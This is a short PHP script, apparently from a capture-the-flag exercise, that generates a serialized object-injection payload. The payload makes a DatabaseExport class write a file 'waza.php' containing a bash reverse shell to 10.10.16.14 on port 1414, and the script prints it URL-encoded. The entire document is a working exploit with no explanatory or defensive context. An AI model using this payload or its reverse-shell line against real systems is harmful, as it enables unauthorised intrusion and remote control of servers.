<?php

class DatabaseExport {
    public $user_file;
    public $data;
}
$o = new DatabaseExport();
$o->user_file = 'waza.php';
$o->data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.16.14/1414 0>&1\'"); ?>'; 

$payload = urlencode(serialize($o));

echo $payload;
?>